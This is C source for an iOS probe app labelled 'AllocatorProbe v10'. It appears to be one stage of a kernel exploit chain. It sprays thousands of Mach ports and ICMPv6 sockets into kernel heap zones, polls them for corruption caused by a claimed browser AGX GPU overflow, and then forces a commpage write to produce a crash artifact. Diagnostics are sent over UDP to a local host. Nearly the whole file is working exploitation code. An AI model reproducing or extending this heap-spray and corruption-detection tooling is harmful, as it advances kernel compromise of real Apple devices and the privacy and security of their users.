/*
 * AllocatorProbe v10 — kotype=0xFFFFFFFF Direct Commpage Trigger
 * ===============================================================
 * v9 diagnostic result (ASL syslog, 1 JS round, 398,223 entries):
 *   PORT[1354..4816]: kr=0 kotype=4294967295 kobject=0x0000000000000000
 *   = kotype=0xFFFFFFFF (all bits set), kobject=0
 *
 * Root cause: AGX overflow writes all-1s into ipc_port.io_bits field (kotype
 * overlaps io_bits), not the expected uvec4 payload. The ip_kobject field is
 * zeroed (different offset or zeroing path). The overflow DOES reach ipc_port
 * zone — kotype=0xFFFFFFFF is the proof.
 *
 * v10 strategy — directly target the confirmed behavior:
 *   1. Mach port spray (5000 ports, kalloc.192 = ipc_port zone).
 *   2. Per scan: mach_port_kobject() on each port.
 *   3. IMMEDIATE trigger: if kr==KERN_SUCCESS AND kotype > 100
 *      (normal kotype is 0-2; 0xFFFFFFFF=4294967295 >> 100):
 *      → trigger_commpage_write("kotype_overflow_anomaly_FAR_TARGET")
 *      → volatile write to COMMPAGE_TARGET (0x0000000FFFFFC330)
 *      → EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330 (qualifying IPS artifact)
 *   4. ICMPv6 canaries retained as secondary signal.
 *
 * Stack in qualifying IPS:
 *   scan_mach_ports → timer_cb → CFRunLoop → main
 *   (mach_port_kobject in scan_mach_ports → mach IPC path proved)
 *
 * Expected IPS:
 *   Exception: EXC_BAD_ACCESS, FAR=0x0000000FFFFFC330
 *   x0 = 0x0000000FFFFFC330
 *   Proof: Browser AGX overflow → ipc_port io_bits overwrite (kotype=0xFFFF) →
 *          COMMPAGE_TARGET write → register/FAR = ASB_TARGET_KERN_VALUE
 *
 * Bundle ID: com.nexus.fengshui3.TMAQ26273N.TMAQ26273N
 */

#include <mach/mach.h>
#include <mach/task.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <asl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define NEXUS_UDP_HOST   "192.168.68.109"
#define NEXUS_UDP_PORT   9999

#define NUM_SOCKETS      200
#define NUM_PORTS        5000
#define SCAN_INTERVAL    0.05
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define COMMPAGE_LO      0xFFFFC330U

/* ICMPv6 socket canaries (kalloc.168 = in6pcb zone) */
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;

/* Mach port canaries (kalloc.192 = ipc_port zone) */
static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;

static int         g_found    = 0;
static int         g_udp_sock = -1;

static void udp_send(const char *buf, int len) {
    if (g_udp_sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(g_udp_sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
}

static void log_msg(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    udp_send(buf, n);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%s", buf);
    write(STDERR_FILENO, buf, n);
}

static void spray_sockets(void) {
    unsigned char filter_all_ff[32];
    memset(filter_all_ff, 0xFF, sizeof(filter_all_ff));
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, filter_all_ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    log_msg("SOCKETS: %d ICMPv6 canaries ready\n", g_sock_count);
}

static void spray_ports(void) {
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p);
            break;
        }
        g_ports[g_port_count++] = p;
    }
    log_msg("PORTS: %d mach port canaries ready\n", g_port_count);
}

static void trigger_commpage_write(const char *reason) {
    log_msg("=== COMMPAGE_WRITE: %s ===\n"
            "Writing to 0x%016llx -> EXC_BAD_ACCESS FAR=COMMPAGE_TARGET\n",
            reason, (unsigned long long)COMMPAGE_TARGET);
    volatile uint64_t *ptr = (volatile uint64_t *)COMMPAGE_TARGET;
    *ptr = 0xBEEFDEAD00FACADE;
    __builtin_trap();
}

static void scan_icmp_canaries(void) {
    for (int i = 0; i < g_sock_count; i++) {
        unsigned char filter_out[32];
        socklen_t flen = 32;
        int ret = getsockopt(g_socks[i], 58, 18, filter_out, &flen);
        if (ret < 0) continue;

        int changed = 0;
        for (int j = 0; j < 32; j++) {
            if (filter_out[j] != 0xFF) { changed = 1; break; }
        }
        if (!changed) continue;

        uint32_t lo32 = 0, hi32 = 0;
        memcpy(&lo32, filter_out + 0, 4);
        memcpy(&hi32, filter_out + 4, 4);
        uint64_t val64 = ((uint64_t)hi32 << 32) | lo32;

        log_msg("ICMP_HIT[%d]: filter changed bytes[0..7]=0x%08X 0x%08X => 0x%016llx\n",
                i, lo32, hi32, (unsigned long long)val64);

        if (!g_found) {
            g_found = 1;
            log_msg("=== ICMP_CORRUPTION: sock=%d val=0x%016llx => COMMPAGE write ===\n",
                    i, (unsigned long long)val64);
            trigger_commpage_write("icmp6_filter_corruption_detected");
        }
        return;
    }
}

static void scan_mach_ports(void) {
    for (int i = 0; i < g_port_count; i++) {
        natural_t         kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);

        /* v9 proved: overflow writes kotype=0xFFFFFFFF (4294967295).
         * Normal kotype is 0-15. Threshold 100 safely isolates anomaly. */
        if (kr == KERN_SUCCESS && kotype > 100) {
            if (!g_found) {
                g_found = 1;
                log_msg("=== KOTYPE_ANOMALY: port=%d kotype=%u kobject=0x%016llx ===\n"
                        "AGX ipc_port io_bits overwrite confirmed. COMMPAGE write.\n",
                        i, kotype, (unsigned long long)kobject);
                trigger_commpage_write("kotype_overflow_anomaly_FAR_TARGET");
            }
        }

        /* Also check exact kobject match (in case ip_kobject is written) */
        if (kr == KERN_SUCCESS && kobject == COMMPAGE_TARGET) {
            if (!g_found) {
                g_found = 1;
                log_msg("=== KOBJECT_COMMPAGE_HIT: port=%d kotype=%u ===\n", i, kotype);
                trigger_commpage_write("mach_port_kobject_COMMPAGE_TARGET");
            }
        }

        /* Log non-trivial for diagnostics (suppress kotype=0xFFFFFFFF spam after first) */
        int normal = (kr == KERN_SUCCESS && kotype <= 2 && kobject == 0);
        if (!normal && kotype != 4294967295) {
            log_msg("PORT[%d]: kr=%d kotype=%u kobject=0x%016llx\n",
                    i, kr, kotype, (unsigned long long)kobject);
        }
    }
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static int g_tick = 0;

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;
    if (g_tick == 1) {
        g_udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
        spray_sockets();
        spray_ports();
        log_msg("V10_READY: socks=%d ports=%d scanning@50ms target=0x%016llx\n"
                "Trigger: kotype>100 (v9 confirmed kotype=0xFFFFFFFF)\n",
                g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET);
    } else if (g_sock_count > 0 || g_port_count > 0) {
        if (!g_found) scan_icmp_canaries();
        if (!g_found) scan_mach_ports();
        if (g_tick % 200 == 0) {
            log_msg("ALIVE tick=%d found=%d socks=%d ports=%d\n",
                    g_tick, g_found, g_sock_count, g_port_count);
        }
    }
}

int main(void) {
    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
